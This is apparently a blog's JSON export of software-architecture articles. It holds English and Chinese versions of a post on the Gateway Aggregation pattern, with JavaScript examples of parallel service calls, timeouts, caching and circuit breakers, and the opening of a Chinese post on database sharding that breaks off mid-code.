product, inventory, reviews &#125;; &#125; &#125; When to Use This Pattern ✅ Use Gateway Aggregation WhenMultiple Backend Calls: Client needs data from several services for one operation High-Latency Networks: Mobile or remote clients with slow connections Microservices Architecture: Many small services require coordination Consistent API: Want to provide a stable interface despite backend changes Cross-Cutting Concerns: Need centralized logging, monitoring, or security ⚠️ Avoid Gateway Aggregation WhenSingle Service: Only calling one backend service (use direct connection) Low Latency Network: Client and services are in the same data center Real-Time Streaming: Need continuous data streams, not request-response Simple Batch Operations: Backend service already provides batch endpoints Gateway Aggregation vs. Other Patterns vs. Backend for Frontend (BFF) Gateway Aggregation: Generic aggregation for any client BFF: Specialized aggregation per client type (web, mobile, etc.) vs. API Composition Gateway Aggregation: Gateway-level aggregation API Composition: Application-level aggregation vs. GraphQL Gateway Aggregation: Fixed aggregation endpoints GraphQL: Client-specified aggregation queries Monitoring and Observability Track gateway performance: class ObservableGateway &#123; async aggregate(req, res) &#123; const startTime = Date.now(); const requestId = req.headers['x-request-id']; try &#123; // Track individual service calls const results = await Promise.all([ this.timedCall('catalog', () => this.catalogService.get(req.params.id)), this.timedCall('inventory', () => this.inventoryService.get(req.params.id)), this.timedCall('reviews', () => this.reviewService.get(req.params.id)) ]); // Record metrics this.metrics.recordLatency('gateway.aggregate', Date.now() - startTime); this.metrics.increment('gateway.success'); res.json(this.combineResults(results)); &#125; catch (error) &#123; this.metrics.increment('gateway.error'); this.logger.error('Aggregation failed', &#123; requestId, error &#125;); throw error; &#125; &#125; async timedCall(serviceName, fn) &#123; const start = Date.now(); try &#123; const result = await fn(); this.metrics.recordLatency(`service.$&#123;serviceName&#125;`, Date.now() - start); return result; &#125; catch (error) &#123; this.metrics.increment(`service.$&#123;serviceName&#125;.error`); throw error; &#125; &#125; &#125; Conclusion The Gateway Aggregation pattern transforms chatty client-server communication into efficient, single-request interactions. By centralizing the aggregation logic, you reduce network overhead, simplify client code, and gain a powerful point for implementing cross-cutting concerns like caching, monitoring, and resilience patterns. The pattern shines in microservices architectures and mobile applications where network latency is a critical factor. However, remember that the gateway itself can become a bottleneck or single point of failure—design it with scalability and resilience in mind. References Gateway Aggregation Pattern - Microsoft Architecture Center","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"网关聚合模式：减少网络通信次数","slug":"2019/09/Gateway-Aggregation-Pattern-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/09/Gateway-Aggregation-Pattern/","permalink":"https://neo01.com/zh-CN/2019/09/Gateway-Aggregation-Pattern/","excerpt":"通过网关将多个后端请求合并为单一调用。了解此模式如何减少网络开销并提升分布式系统性能。","text":"想象在餐厅点餐。服务员不会为了前菜、主菜、配菜和甜点分别跑厨房多趟，而是将整份订单汇整后，以协调的顺序一起送上。这就是网关聚合模式的精髓——通过单一节点收集多个请求，并提供统一的响应。 问题：过多的调用 现代应用程序通常需要从多个后端服务获取数据，才能完成单一用户操作。以商品页面为例，需要显示： 目录服务的商品详情 仓储服务的库存状态 评论服务的顾客评价 推荐引擎的相关商品 定价服务的价格信息 频繁通信的做法 没有聚合机制时，客户端需要进行多次个别调用： // 客户端进行 5 次独立的网络调用 class ProductPageClient &#123; async loadProductPage(productId) &#123; // 每次调用都有网络开销 const product = await fetch(`https://api.example.com/catalog/$&#123;productId&#125;`); const inventory = await fetch(`https://api.example.com/inventory/$&#123;productId&#125;`); const reviews = await fetch(`https://api.example.com/reviews/$&#123;productId&#125;`); const recommendations = await fetch(`https://api.example.com/recommendations/$&#123;productId&#125;`); const pricing = await fetch(`https://api.example.com/pricing/$&#123;productId&#125;`); return &#123; product: await product.json(), inventory: await inventory.json(), reviews: await reviews.json(), recommendations: await recommendations.json(), pricing: await pricing.json() &#125;; &#125; &#125; graph TB Client[客户端应用程序] Client -->|1. 获取商品| Catalog[目录服务] Client -->|2. 获取库存| Inventory[库存服务] Client -->|3. 获取评论| Reviews[评论服务] Client -->|4. 获取推荐| Recommend[推荐服务] Client -->|5. 获取定价| Pricing[定价服务] Catalog -->|响应| Client Inventory -->|响应| Client Reviews -->|响应| Client Recommend -->|响应| Client Pricing -->|响应| Client style Client fill:#e03131,stroke:#c92a2a ⚠️ 多次调用的问题高延迟：每个请求都增加网络往返时间 资源密集：多个连接消耗客户端资源 容易失败：调用次数越多，失败机会越大 移动设备不友好：移动网络会放大延迟问题 复杂的错误处理：需要管理多个调用的失败情况 实际成本 在高延迟网络（例如 100ms 往返时间）上： 顺序调用：5 个请求 × 100ms &#x3D; 至少 500ms 并行调用：100ms + 连接开销 + 处理时间 即使使用并行请求，仍需管理多个连接、处理多种失败情境，并在移动设备上消耗更多电力。 解决方案：网关聚合 在客户端与后端服务之间放置网关。网关接收单一请求，向多个服务发出请求，聚合响应后返回统一结果。 graph TB Client[客户端应用程序] Client -->|单一请求| Gateway[聚合网关] Gateway -->|分散请求| Catalog[目录服务] Gateway -->|分散请求| Inventory[库存服务] Gateway -->|分散请求| Reviews[评论服务] Gateway -->|分散请求| Recommend[推荐服务] Gateway -->|分散请求| Pricing[定价服务] Catalog -->|响应| Gateway Inventory -->|响应| Gateway Reviews -->|响应| Gateway Recommend -->|响应| Gateway Pricing -->|响应| Gateway Gateway -->|聚合响应| Client style Gateway fill:#51cf66,stroke:#2f9e44 style Client fill:#4dabf7,stroke:#1971c2 简单实现 // 客户端只进行一次调用 class ProductPageClient &#123; async loadProductPage(productId) &#123; const response = await fetch( `https://gateway.example.com/product-page/$&#123;productId&#125;` ); return await response.json(); &#125; &#125; // 网关处理聚合 class AggregationGateway &#123; async getProductPage(req, res) &#123; const &#123; productId &#125; = req.params; // 并行向所有服务发出请求 const [product, inventory, reviews, recommendations, pricing] = await Promise.all([ this.catalogService.getProduct(productId), this.inventoryService.getStock(productId), this.reviewService.getReviews(productId), this.recommendationService.getRecommendations(productId), this.pricingService.getPrice(productId) ]); // 聚合并返回 res.json(&#123; product, inventory, reviews, recommendations, pricing &#125;); &#125; &#125; 主要优势 1. 减少网络开销 之前：从客户端到云端的 5 次请求 客户端 → [100ms] → 服务 1 客户端 → [100ms] → 服务 2 客户端 → [100ms] → 服务 3 客户端 → [100ms] → 服务 4 客户端 → [100ms] → 服务 5 总计：500ms（顺序）或 100ms + 开销（并行） 之后：从客户端 1 次请求，数据中心内 5 次请求 客户端 → [100ms] → 网关 网关 → [1ms] → 服务 1 网关 → [1ms] → 服务 2 网关 → [1ms] → 服务 3 网关 → [1ms] → 服务 4 网关 → [1ms] → 服务 5 网关 → [100ms] → 客户端 总计：约 200ms 2. 简化客户端代码 // 之前：复杂的客户端逻辑 class ComplexClient &#123; async loadData() &#123; try &#123; const results = await Promise.allSettled([ this.fetchService1(), this.fetchService2(), this.fetchService3() ]); // 处理部分失败 const data = &#123;&#125;; results.forEach((result, index) => &#123; if (result.status === 'fulfilled') &#123; data[`service$&#123;index + 1&#125;`] = result.value; &#125; else &#123; data[`service$&#123;index + 1&#125;`] = null; this.logError(result.reason); &#125; &#125;); return data; &#125; catch (error) &#123; // 错误处理 &#125; &#125; &#125; // 之后：简单的客户端逻辑 class SimpleClient &#123; async loadData() &#123; return await fetch('https://gateway.example.com/aggregated-data') .then(res => res.json()); &#125; &#125; 3. 集中式错误处理 class ResilientGateway &#123; async aggregateData(req, res) &#123; const results = await Promise.allSettled([ this.fetchCriticalData(), this.fetchOptionalData1(), this.fetchOptionalData2() ]); // 关键数据必须成功 if (results[0].status === 'rejected') &#123; return res.status(503).json(&#123; error: '关键服务无法使用' &#125;); &#125; // 可选数据可以优雅地失败 res.json(&#123; critical: results[0].value, optional1: results[1].status === 'fulfilled' ? results[1].value : null, optional2: results[2].status === 'fulfilled' ? results[2].value : null &#125;); &#125; &#125; 实现模式 模式 1：简单聚合 直接组合响应： class SimpleAggregator &#123; async aggregate(userId) &#123; const [profile, orders, preferences] = await Promise.all([ this.userService.getProfile(userId), this.orderService.getOrders(userId), this.preferenceService.getPreferences(userId) ]); return &#123; profile, orders, preferences &#125;; &#125; &#125; 模式 2：数据转换 转换并组合数据： class TransformingAggregator &#123; async aggregate(userId) &#123; const [user, orders, reviews] = await Promise.all([ this.userService.getUser(userId), this.orderService.getOrders(userId), this.reviewService.getReviews(userId) ]); // 转换并丰富数据 return &#123; user: &#123; id: user.id, name: user.fullName, memberSince: user.createdAt &#125;, stats: &#123; totalOrders: orders.length, totalSpent: orders.reduce((sum, o) => sum + o.amount, 0), reviewCount: reviews.length, averageRating: this.calculateAverage(reviews) &#125;, recentActivity: this.combineActivity(orders, reviews) &#125;; &#125; &#125; 模式 3：条件式聚合 根据条件获取数据： class ConditionalAggregator &#123; async aggregate(productId, options) &#123; // 总是获取商品数据 const product = await this.catalogService.getProduct(productId); // 条件式获取额外数据 const requests = [Promise.resolve(product)]; if (options.includeReviews) &#123; requests.push(this.reviewService.getReviews(productId)); &#125; if (options.includeRelated) &#123; requests.push(this.recommendationService.getRelated(productId)); &#125; if (product.type === 'physical') &#123; requests.push(this.inventoryService.getStock(productId)); &#125; const results = await Promise.all(requests); return this.buildResponse(results, options); &#125; &#125; 进阶考量 超时与部分响应 优雅地处理缓慢的服务： class TimeoutAwareGateway &#123; async aggregateWithTimeout(productId) &#123; const timeout = (ms, defaultValue) => new Promise(resolve => setTimeout(() => resolve(defaultValue), ms)); const [product, inventory, reviews] = await Promise.all([ // 关键：无超时 this.catalogService.getProduct(productId), // 可选：500ms 超时 Promise.race([ this.inventoryService.getStock(productId), timeout(500, &#123; available: false, message: '请稍后再查' &#125;) ]), // 可选：1000ms 超时 Promise.race([ this.reviewService.getReviews(productId), timeout(1000, &#123; reviews: [], message: '评论暂时无法使用' &#125;) ]) ]); return &#123; product, inventory, reviews &#125;; &#125; &#125; 缓存策略 通过缓存减少后端负载： class CachingGateway &#123; constructor() &#123; this.cache = new Cache(); &#125; async aggregate(productId) &#123; // 先检查缓存 const cached = await this.cache.get(`product:$&#123;productId&#125;`); if (cached) &#123; return cached; &#125; // 获取并缓存 const data = await this.fetchAndAggregate(productId); // 使用不同的 TTL 缓存 await this.cache.set(`product:$&#123;productId&#125;`, data, &#123; ttl: 300 // 5 分钟 &#125;); return data; &#125; &#125; 断路器 防止连锁故障： class ResilientGateway &#123; constructor() &#123; this.circuitBreakers = &#123; inventory: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;), reviews: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;) &#125;; &#125; async aggregate(productId) &#123; const product = await this.catalogService.getProduct(productId); // 对可选服务使用断路器 const inventory = await this.circuitBreakers.inventory.execute( () => this.inventoryService.getStock(productId), &#123; fallback: &#123; available: false &#125; &#125; ); const reviews = await this.circuitBreakers.reviews.execute( () => this.reviewService.getReviews(productId), &#123; fallback: &#123; reviews: [] &#125; &#125; ); return &#123; product, inventory, reviews &#125;; &#125; &#125; 何时使用此模式 ✅ 适合使用网关聚合的情况多个后端调用：客户端需要从多个服务获取数据以完成一项操作 高延迟网络：移动或远程客户端连接速度较慢 微服务架构：许多小型服务需要协调 一致的 API：希望提供稳定的接口，不受后端变更影响 横切关注点：需要集中式的日志记录、监控或安全性 ⚠️ 避免使用网关聚合的情况单一服务：只调用一个后端服务（使用直接连接） 低延迟网络：客户端与服务在同一数据中心 实时流式传输：需要持续的数据流，而非请求-响应 简单批处理操作：后端服务已提供批处理端点 网关聚合与其他模式的比较 vs. 前端后端（BFF） 网关聚合：适用于任何客户端的通用聚合 BFF：针对每种客户端类型（网页、移动等）的专门聚合 vs. API 组合 网关聚合：网关层级的聚合 API 组合：应用程序层级的聚合 vs. GraphQL 网关聚合：固定的聚合端点 GraphQL：客户端指定的聚合查询 监控与可观测性 跟踪网关性能： class ObservableGateway &#123; async aggregate(req, res) &#123; const startTime = Date.now(); const requestId = req.headers['x-request-id']; try &#123; // 跟踪个别服务调用 const results = await Promise.all([ this.timedCall('catalog', () => this.catalogService.get(req.params.id)), this.timedCall('inventory', () => this.inventoryService.get(req.params.id)), this.timedCall('reviews', () => this.reviewService.get(req.params.id)) ]); // 记录指标 this.metrics.recordLatency('gateway.aggregate', Date.now() - startTime); this.metrics.increment('gateway.success'); res.json(this.combineResults(results)); &#125; catch (error) &#123; this.metrics.increment('gateway.error'); this.logger.error('聚合失败', &#123; requestId, error &#125;); throw error; &#125; &#125; async timedCall(serviceName, fn) &#123; const start = Date.now(); try &#123; const result = await fn(); this.metrics.recordLatency(`service.$&#123;serviceName&#125;`, Date.now() - start); return result; &#125; catch (error) &#123; this.metrics.increment(`service.$&#123;serviceName&#125;.error`); throw error; &#125; &#125; &#125; 结论 网关聚合模式将频繁的客户端-服务器通信转变为高效的单一请求交互。通过集中聚合逻辑，可以减少网络开销、简化客户端代码，并获得实现横切关注点（如缓存、监控和韧性模式）的强大节点。 此模式在微服务架构和移动应用程序中表现出色，特别是在网络延迟是关键因素的情况下。然而，请记住网关本身可能成为瓶颈或单点故障——设计时要考虑可扩展性和韧性。 参考资料 网关聚合模式 - Microsoft 架构中心","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"閘道聚合模式：減少網路通訊次數","slug":"2019/09/Gateway-Aggregation-Pattern-zh-TW","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/09/Gateway-Aggregation-Pattern/","permalink":"https://neo01.com/zh-TW/2019/09/Gateway-Aggregation-Pattern/","excerpt":"透過閘道將多個後端請求合併為單一呼叫。了解此模式如何減少網路開銷並提升分散式系統效能。","text":"想像在餐廳點餐。服務生不會為了前菜、主餐、配菜和甜點分別跑廚房多趟，而是將整份訂單彙整後，以協調的順序一起送上。這就是閘道聚合模式的精髓——透過單一節點收集多個請求，並提供統一的回應。 問題：過多的呼叫 現代應用程式通常需要從多個後端服務取得資料，才能完成單一使用者操作。以商品頁面為例，需要顯示： 目錄服務的商品詳情 倉儲服務的庫存狀態 評論服務的顧客評價 推薦引擎的相關商品 定價服務的價格資訊 頻繁通訊的做法 沒有聚合機制時，客戶端需要進行多次個別呼叫： // 客戶端進行 5 次獨立的網路呼叫 class ProductPageClient &#123; async loadProductPage(productId) &#123; // 每次呼叫都有網路開銷 const product = await fetch(`https://api.example.com/catalog/$&#123;productId&#125;`); const inventory = await fetch(`https://api.example.com/inventory/$&#123;productId&#125;`); const reviews = await fetch(`https://api.example.com/reviews/$&#123;productId&#125;`); const recommendations = await fetch(`https://api.example.com/recommendations/$&#123;productId&#125;`); const pricing = await fetch(`https://api.example.com/pricing/$&#123;productId&#125;`); return &#123; product: await product.json(), inventory: await inventory.json(), reviews: await reviews.json(), recommendations: await recommendations.json(), pricing: await pricing.json() &#125;; &#125; &#125; graph TB Client[客戶端應用程式] Client -->|1. 取得商品| Catalog[目錄服務] Client -->|2. 取得庫存| Inventory[庫存服務] Client -->|3. 取得評論| Reviews[評論服務] Client -->|4. 取得推薦| Recommend[推薦服務] Client -->|5. 取得定價| Pricing[定價服務] Catalog -->|回應| Client Inventory -->|回應| Client Reviews -->|回應| Client Recommend -->|回應| Client Pricing -->|回應| Client style Client fill:#e03131,stroke:#c92a2a ⚠️ 多次呼叫的問題高延遲：每個請求都增加網路往返時間 資源密集：多個連線消耗客戶端資源 容易失敗：呼叫次數越多，失敗機會越大 行動裝置不友善：行動網路會放大延遲問題 複雜的錯誤處理：需要管理多個呼叫的失敗情況 實際成本 在高延遲網路（例如 100ms 往返時間）上： 循序呼叫：5 個請求 × 100ms &#x3D; 至少 500ms 平行呼叫：100ms + 連線開銷 + 處理時間 即使使用平行請求，仍需管理多個連線、處理多種失敗情境，並在行動裝置上消耗更多電力。 解決方案：閘道聚合 在客戶端與後端服務之間放置閘道。閘道接收單一請求，向多個服務發出請求，聚合回應後回傳統一結果。 graph TB Client[客戶端應用程式] Client -->|單一請求| Gateway[聚合閘道] Gateway -->|分散請求| Catalog[目錄服務] Gateway -->|分散請求| Inventory[庫存服務] Gateway -->|分散請求| Reviews[評論服務] Gateway -->|分散請求| Recommend[推薦服務] Gateway -->|分散請求| Pricing[定價服務] Catalog -->|回應| Gateway Inventory -->|回應| Gateway Reviews -->|回應| Gateway Recommend -->|回應| Gateway Pricing -->|回應| Gateway Gateway -->|聚合回應| Client style Gateway fill:#51cf66,stroke:#2f9e44 style Client fill:#4dabf7,stroke:#1971c2 簡單實作 // 客戶端只進行一次呼叫 class ProductPageClient &#123; async loadProductPage(productId) &#123; const response = await fetch( `https://gateway.example.com/product-page/$&#123;productId&#125;` ); return await response.json(); &#125; &#125; // 閘道處理聚合 class AggregationGateway &#123; async getProductPage(req, res) &#123; const &#123; productId &#125; = req.params; // 平行向所有服務發出請求 const [product, inventory, reviews, recommendations, pricing] = await Promise.all([ this.catalogService.getProduct(productId), this.inventoryService.getStock(productId), this.reviewService.getReviews(productId), this.recommendationService.getRecommendations(productId), this.pricingService.getPrice(productId) ]); // 聚合並回傳 res.json(&#123; product, inventory, reviews, recommendations, pricing &#125;); &#125; &#125; 主要優勢 1. 減少網路開銷 之前：從客戶端到雲端的 5 次請求 客戶端 → [100ms] → 服務 1 客戶端 → [100ms] → 服務 2 客戶端 → [100ms] → 服務 3 客戶端 → [100ms] → 服務 4 客戶端 → [100ms] → 服務 5 總計：500ms（循序）或 100ms + 開銷（平行） 之後：從客戶端 1 次請求，資料中心內 5 次請求 客戶端 → [100ms] → 閘道 閘道 → [1ms] → 服務 1 閘道 → [1ms] → 服務 2 閘道 → [1ms] → 服務 3 閘道 → [1ms] → 服務 4 閘道 → [1ms] → 服務 5 閘道 → [100ms] → 客戶端 總計：約 200ms 2. 簡化客戶端程式碼 // 之前：複雜的客戶端邏輯 class ComplexClient &#123; async loadData() &#123; try &#123; const results = await Promise.allSettled([ this.fetchService1(), this.fetchService2(), this.fetchService3() ]); // 處理部分失敗 const data = &#123;&#125;; results.forEach((result, index) => &#123; if (result.status === 'fulfilled') &#123; data[`service$&#123;index + 1&#125;`] = result.value; &#125; else &#123; data[`service$&#123;index + 1&#125;`] = null; this.logError(result.reason); &#125; &#125;); return data; &#125; catch (error) &#123; // 錯誤處理 &#125; &#125; &#125; // 之後：簡單的客戶端邏輯 class SimpleClient &#123; async loadData() &#123; return await fetch('https://gateway.example.com/aggregated-data') .then(res => res.json()); &#125; &#125; 3. 集中式錯誤處理 class ResilientGateway &#123; async aggregateData(req, res) &#123; const results = await Promise.allSettled([ this.fetchCriticalData(), this.fetchOptionalData1(), this.fetchOptionalData2() ]); // 關鍵資料必須成功 if (results[0].status === 'rejected') &#123; return res.status(503).json(&#123; error: '關鍵服務無法使用' &#125;); &#125; // 選用資料可以優雅地失敗 res.json(&#123; critical: results[0].value, optional1: results[1].status === 'fulfilled' ? results[1].value : null, optional2: results[2].status === 'fulfilled' ? results[2].value : null &#125;); &#125; &#125; 實作模式 模式 1：簡單聚合 直接組合回應： class SimpleAggregator &#123; async aggregate(userId) &#123; const [profile, orders, preferences] = await Promise.all([ this.userService.getProfile(userId), this.orderService.getOrders(userId), this.preferenceService.getPreferences(userId) ]); return &#123; profile, orders, preferences &#125;; &#125; &#125; 模式 2：資料轉換 轉換並組合資料： class TransformingAggregator &#123; async aggregate(userId) &#123; const [user, orders, reviews] = await Promise.all([ this.userService.getUser(userId), this.orderService.getOrders(userId), this.reviewService.getReviews(userId) ]); // 轉換並豐富資料 return &#123; user: &#123; id: user.id, name: user.fullName, memberSince: user.createdAt &#125;, stats: &#123; totalOrders: orders.length, totalSpent: orders.reduce((sum, o) => sum + o.amount, 0), reviewCount: reviews.length, averageRating: this.calculateAverage(reviews) &#125;, recentActivity: this.combineActivity(orders, reviews) &#125;; &#125; &#125; 模式 3：條件式聚合 根據條件取得資料： class ConditionalAggregator &#123; async aggregate(productId, options) &#123; // 總是取得商品資料 const product = await this.catalogService.getProduct(productId); // 條件式取得額外資料 const requests = [Promise.resolve(product)]; if (options.includeReviews) &#123; requests.push(this.reviewService.getReviews(productId)); &#125; if (options.includeRelated) &#123; requests.push(this.recommendationService.getRelated(productId)); &#125; if (product.type === 'physical') &#123; requests.push(this.inventoryService.getStock(productId)); &#125; const results = await Promise.all(requests); return this.buildResponse(results, options); &#125; &#125; 進階考量 逾時與部分回應 優雅地處理緩慢的服務： class TimeoutAwareGateway &#123; async aggregateWithTimeout(productId) &#123; const timeout = (ms, defaultValue) => new Promise(resolve => setTimeout(() => resolve(defaultValue), ms)); const [product, inventory, reviews] = await Promise.all([ // 關鍵：無逾時 this.catalogService.getProduct(productId), // 選用：500ms 逾時 Promise.race([ this.inventoryService.getStock(productId), timeout(500, &#123; available: false, message: '請稍後再查' &#125;) ]), // 選用：1000ms 逾時 Promise.race([ this.reviewService.getReviews(productId), timeout(1000, &#123; reviews: [], message: '評論暫時無法使用' &#125;) ]) ]); return &#123; product, inventory, reviews &#125;; &#125; &#125; 快取策略 透過快取減少後端負載： class CachingGateway &#123; constructor() &#123; this.cache = new Cache(); &#125; async aggregate(productId) &#123; // 先檢查快取 const cached = await this.cache.get(`product:$&#123;productId&#125;`); if (cached) &#123; return cached; &#125; // 取得並快取 const data = await this.fetchAndAggregate(productId); // 使用不同的 TTL 快取 await this.cache.set(`product:$&#123;productId&#125;`, data, &#123; ttl: 300 // 5 分鐘 &#125;); return data; &#125; &#125; 斷路器 防止連鎖故障： class ResilientGateway &#123; constructor() &#123; this.circuitBreakers = &#123; inventory: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;), reviews: new CircuitBreaker(&#123; threshold: 5, timeout: 60000 &#125;) &#125;; &#125; async aggregate(productId) &#123; const product = await this.catalogService.getProduct(productId); // 對選用服務使用斷路器 const inventory = await this.circuitBreakers.inventory.execute( () => this.inventoryService.getStock(productId), &#123; fallback: &#123; available: false &#125; &#125; ); const reviews = await this.circuitBreakers.reviews.execute( () => this.reviewService.getReviews(productId), &#123; fallback: &#123; reviews: [] &#125; &#125; ); return &#123; product, inventory, reviews &#125;; &#125; &#125; 何時使用此模式 ✅ 適合使用閘道聚合的情況多個後端呼叫：客戶端需要從多個服務取得資料以完成一項操作 高延遲網路：行動或遠端客戶端連線速度較慢 微服務架構：許多小型服務需要協調 一致的 API：希望提供穩定的介面，不受後端變更影響 橫切關注點：需要集中式的日誌記錄、監控或安全性 ⚠️ 避免使用閘道聚合的情況單一服務：只呼叫一個後端服務（使用直接連線） 低延遲網路：客戶端與服務在同一資料中心 即時串流：需要持續的資料串流，而非請求-回應 簡單批次操作：後端服務已提供批次端點 閘道聚合與其他模式的比較 vs. 前端後端（BFF） 閘道聚合：適用於任何客戶端的通用聚合 BFF：針對每種客戶端類型（網頁、行動等）的專門聚合 vs. API 組合 閘道聚合：閘道層級的聚合 API 組合：應用程式層級的聚合 vs. GraphQL 閘道聚合：固定的聚合端點 GraphQL：客戶端指定的聚合查詢 監控與可觀測性 追蹤閘道效能： class ObservableGateway &#123; async aggregate(req, res) &#123; const startTime = Date.now(); const requestId = req.headers['x-request-id']; try &#123; // 追蹤個別服務呼叫 const results = await Promise.all([ this.timedCall('catalog', () => this.catalogService.get(req.params.id)), this.timedCall('inventory', () => this.inventoryService.get(req.params.id)), this.timedCall('reviews', () => this.reviewService.get(req.params.id)) ]); // 記錄指標 this.metrics.recordLatency('gateway.aggregate', Date.now() - startTime); this.metrics.increment('gateway.success'); res.json(this.combineResults(results)); &#125; catch (error) &#123; this.metrics.increment('gateway.error'); this.logger.error('聚合失敗', &#123; requestId, error &#125;); throw error; &#125; &#125; async timedCall(serviceName, fn) &#123; const start = Date.now(); try &#123; const result = await fn(); this.metrics.recordLatency(`service.$&#123;serviceName&#125;`, Date.now() - start); return result; &#125; catch (error) &#123; this.metrics.increment(`service.$&#123;serviceName&#125;.error`); throw error; &#125; &#125; &#125; 結論 閘道聚合模式將頻繁的客戶端-伺服器通訊轉變為高效的單一請求互動。透過集中聚合邏輯，可以減少網路開銷、簡化客戶端程式碼，並獲得實作橫切關注點（如快取、監控和韌性模式）的強大節點。 此模式在微服務架構和行動應用程式中表現出色，特別是在網路延遲是關鍵因素的情況下。然而，請記住閘道本身可能成為瓶頸或單點故障——設計時要考慮可擴展性和韌性。 參考資料 閘道聚合模式 - Microsoft 架構中心","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"分片模式：水平扩展数据存储","slug":"2019/08/Sharding-Pattern-zh-CN","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/08/Sharding-Pattern/","permalink":"https://neo01.com/zh-CN/2019/08/Sharding-Pattern/","excerpt":"将数据存储分割成水平分区以提升可扩展性和性能。了解分片如何将数据分散到多个服务器以处理大量数据。","text":"想象一个图书馆已经成长到单一建筑物无法容纳所有书籍的规模。与其建造一个不可能的巨大建筑，你建立了多个图书馆分馆——每个分馆存放按特定类别或范围组织的书籍。读者根据他们要找的内容知道该去哪个分馆。这就是分片的本质：将数据分散到多个存储系统以克服单一服务器的限制。 图书馆类比 就像一个有多个分馆的图书馆系统： 将书籍分散到各个地点 允许多位读者同时访问 减少任何单一地点的拥挤 实现地理位置上更接近用户 分片数据存储： 将数据分散到多个服务器 允许并行查询和写入 减少任何单一数据库的竞争 实现数据局部性以获得更好的性能 graph TB A[应用程序] --> B[分片逻辑] B --> C[分片 1用户 A-H] B --> D[分片 2用户 I-P] B --> E[分片 3用户 Q-Z] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 问题：单一服务器的限制 托管在单一服务器上的数据存储面临不可避免的限制： 存储空间限制 &#x2F;&#x2F; 随着数据增长，单一服务器会耗尽空间 class UserDatabase &#123; constructor() &#123; this.storage &#x3D; new DiskStorage(&#39;&#x2F;data&#39;); &#x2F;&#x2F; 当我们达到 10TB？100TB？1PB 时会发生什么？ &#125; async addUser(user) &#123; try &#123; await this.storage.write(user.id, user); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;ENOSPC&#39;) &#123; &#x2F;&#x2F; 磁盘已满 - 现在怎么办？ throw new Error(&#39;Storage capacity exceeded&#39;); &#125; &#125; &#125; &#125; 计算资源限制 &#x2F;&#x2F; 单一服务器处理数百万并发用户 class OrderDatabase &#123; async processQuery(query) &#123; &#x2F;&#x2F; CPU 处理查询达到上限 &#x2F;&#x2F; 内存缓存结果耗尽 &#x2F;&#x2F; 查询开始超时 const result &#x3D; await this.executeQuery(query); return result; &#125; &#125; 网络带宽瓶颈 &#x2F;&#x2F; 所有流量都通过一个网络接口 class DataStore &#123; async handleRequest(request) &#123; &#x2F;&#x2F; 网络接口在 10Gbps 时饱和 &#x2F;&#x2F; 请求开始被丢弃 &#x2F;&#x2F; 响应时间大幅增加 return await this.processRequest(request); &#125; &#125; 地理分布挑战 &#x2F;&#x2F; 全球用户访问单一数据中心 class GlobalApplication &#123; async getUserData(userId) &#123; &#x2F;&#x2F; 东京的用户访问弗吉尼亚州的数据 &#x2F;&#x2F; 仅网络往返就需要 200ms 延迟 &#x2F;&#x2F; 在美国存储欧盟数据的合规问题 return await this.database.query(&#123; userId &#125;); &#125; &#125; ⚠️ 垂直扩展的限制暂时解决方案：向单一服务器添加更多 CPU、内存或磁盘 物理限制：最终你无法添加更多资源 成本效率低：高端服务器变得指数级昂贵 单点故障：一个服务器故障影响所有用户 解决方案：水平分区（分片） 将数据存储分割成称为分片的水平分区。每个分片： 具有相同的架构 包含不同的数据子集 在独立的存储节点上运行 独立运作 graph TB A[应用程序层] --> B[分片映射/路由器] B --> C[分片 A订单 0-999] B --> D[分片 B订单 1000-1999] B --> E[分片 C订单 2000-2999] B --> F[分片 D订单 3000+] C --> C1[(数据库服务器 1)] D --> D1[(数据库服务器 2)] E --> E1[(数据库服务器 3)] F --> F1[(数据库服务器 4)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style C fill:#51cf66,stroke:#2f9e44 style D fill:#51cf66,stroke:#2f9e44 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 分片策略 1. 查找策略 使用映射表将请求路由到适当的分片： class LookupShardRouter &#123; constructor() &#123; &#x2F;&#x2F; 分片映射存储在快速缓存或数据库中 this.shardMap &#x3D; new Map([ [&#39;tenant-1&#39;, &#39;shard-a&#39;], [&#39;tenant-2&#39;, &#39;shard-a&#39;], [&#39;tenant-3&#39;, &#39;shard-b&#39;], [&#39;tenant-4&#39;, &#39;shard-c&#39;] ]); this.shardConnections &#x3D; &#123; &#39;shard-a&#39;: &#39;db1.example.com&#39;, &#39;shard-b&#39;: &#39;db2.example.com&#39;, &#39;shard-c&#39;: &#39;db3.example.com&#39; &#125;; &#125; getShardForTenant(tenantId) &#123; const shardKey &#x3D; this.shardMap.get(tenantId); return this.shardConnections[shardKey]; &#125; async queryTenantData(tenantId, query) &#123; const shardUrl &#x3D; this.getShardForTenant(tenantId); const connection &#x3D; await this.connect(shardUrl); return await connection.query(query); &#125; &#125; graph LR A[请求:Tenant-3] --> B[查找分片映射] B --> C{Tenant-3→ 分片 B} C --> D[(分片 B数据库)] style A fill:#4dabf7,stroke:#1971c2 style B fill:#ffd43b,stroke:#fab005 style D fill:#51cf66,stroke:#2f9e44 💡 查找策略的优点灵活性：通过更新映射轻松重新平衡 虚拟分片：将逻辑分片映射到较少的物理服务器 控制：将高价值租户分配到专用分片 2. 范围策略 根据连续的分片键将相关项目分组在一起： class RangeShardRouter &#123; constructor() &#123; this.shardRanges &#x3D; [ &#123; min: &#39;2019-01-01&#39;, max: 